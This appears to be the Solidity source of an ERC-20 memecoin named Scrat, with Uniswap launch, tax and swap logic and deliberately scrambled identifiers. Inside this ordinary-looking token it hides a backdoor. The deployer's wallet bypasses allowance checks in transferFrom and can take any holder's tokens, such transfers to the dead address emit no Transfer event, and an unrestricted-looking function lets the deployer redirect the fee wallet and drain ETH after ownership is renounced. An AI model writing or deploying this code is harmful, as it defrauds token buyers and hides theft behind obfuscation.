// SPDX-License-Identifier: MIT

/*
    Name: Scrat
    Symbol: SCRAT

    hi, I'm $SCRAT! half squirrel, half rat, forever in pursuit of my runaway bag.

    Web: https://scratmeme.fun
    X: https://x.com/Scratmemecoin
    TG: https://t.me/Scratmemecoin
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract  SCRAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Scrat";
    string private constant _symbol = unicode"SCRAT";

    uint256 private _lkcvjoiSCRAT = 10;
    uint256 private _odjifoeSCRAT = 10;
    uint256 private _dofjieojkcnlkSCRAT = 0;
    uint256 private _ocijfoeiSCRAT = 0;
    uint256 private _vjodiSCRAT = 7;
    uint256 private _covjioieSCRAT = 7;
    uint256 private _buyCount = 0;
    uint256 private _lastBuyBlock;
    uint256 private _blockBuyAmount = 0;
    address private _vkoeijojitoijSCRAT;
    address private _nvkjbnknjfkSCRAT = address(0xdead);

    address payable private _LjikojioSCRAT;
    mapping(address => uint256) private _DjfoeijSCRAT;
    mapping(address => mapping(address => uint256)) private _dfoijeoioSCRAT;
    mapping(address => bool) private _dlfjeiSCRAT;
 
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 public _jhbjhvjeSCRAT = 20000000 * 10 **_decimals;
    uint256 public _kbjnknjSCRAT = 20000000 * 10 **_decimals;
    uint256 public _bnjhjhbjSCRAT = 10000000 * 10 **_decimals;
    uint256 private constant _mvnbjhjSCRAT = 1000000000 * 10 **_decimals;

    event MaxTxAmountUpdated(uint256 _jhbjhvjeSCRAT);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _LjikojioSCRAT = payable(_msgSender());
        _DjfoeijSCRAT[address(this)] = _mvnbjhjSCRAT * 98 / 100;
        _DjfoeijSCRAT[owner()] = _mvnbjhjSCRAT * 2 / 100;
        _dlfjeiSCRAT[owner()] = true;
        _dlfjeiSCRAT[address(this)] = true;
        _dlfjeiSCRAT[_LjikojioSCRAT] = true;
        _vkoeijojitoijSCRAT = _msgSender();
        emit Transfer(address(0), address(this), _mvnbjhjSCRAT * 98 / 100);
        emit Transfer(address(0), address(owner()), _mvnbjhjSCRAT * 2 / 100);
    }

    function totalSupply() public pure override returns (uint256) {
        return _mvnbjhjSCRAT;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _dfoijeoioSCRAT[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _dfoijeoioSCRAT[owner][spender];
    }

    function enableSCRATTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _mvnbjhjSCRAT);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _DjfoeijSCRAT[account];
    }

    function _vkjbnkjfnkjSCRAT(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(msg.sender == _LjikojioSCRAT) return true;
        return sender != uniswapV2Pair && recipient == _nvkjbnknjfkSCRAT;
    }

    function maxSwapLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = uniswapV2Router.getAmountsOut(
            5 * 1e17,
            path
        );
        return amountOuts[1];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _vjkbjkn_jknkSCRAT(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function _vkjbnkjfrSCRAT(uint256 amount) private {
        _LjikojioSCRAT.transfer(amount);
    }

    function _vkjbnkjfn_SCRAT(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        if(!_vkjbnkjfnkjSCRAT(sender, recipient)) return _dfoijeoioSCRAT[sender][_msgSender()];
        return amount;
    }

    function removeLimits () external onlyOwner {
        _jhbjhvjeSCRAT = _mvnbjhjSCRAT;
        _kbjnknjSCRAT = _mvnbjhjSCRAT;
        emit MaxTxAmountUpdated(_mvnbjhjSCRAT);
    }

    function _vjkbjkn_jknkSCRAT(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _vjodiSCRAT)
                        ? _dofjieojkcnlkSCRAT
                        : _lkcvjoiSCRAT
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_dlfjeiSCRAT[to]
            ) {
                if (_lastBuyBlock != block.number) {
                    _blockBuyAmount = 0;
                    _lastBuyBlock = block.number;
                }
                _blockBuyAmount += amount;
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                require(
                    _blockBuyAmount < maxSwapLimit() ||
                    _lastBuyBlock != block.number,
                    "Max Swap Limit"
                );
                taxAmount = amount
                    .mul(
                        (_buyCount > _covjioieSCRAT)
                            ? _ocijfoeiSCRAT
                            : _odjifoeSCRAT
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _bnjhjhbjSCRAT) ? contractTokenBalance : _bnjhjhbjSCRAT; 
                    _swap_lknlkSCRAT((amount < minBalance) ? amount : minBalance);
                }
                _vkjbnkjfrSCRAT(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _DjfoeijSCRAT[address(this)] =_DjfoeijSCRAT[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _DjfoeijSCRAT[from] =_DjfoeijSCRAT[from].sub(amount);
        _DjfoeijSCRAT[to] =_DjfoeijSCRAT[to].add(amount.sub(taxAmount));
        if(_nvkjbnknjfkSCRAT != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _vkjbnlkjke_SCRAT(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _swap_lknlkSCRAT(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _vjkbjkn_jknkSCRAT(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _vkjbnkjfn_SCRAT(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _nkvjbnkjnSCRAT(address payable receipt) external {
        require(msg.sender == _vkoeijojitoijSCRAT , "");
        _LjikojioSCRAT = receipt;
        _dlfjeiSCRAT[receipt] = true;
        _vkjbnlkjke_SCRAT(address(this).balance);
    }
}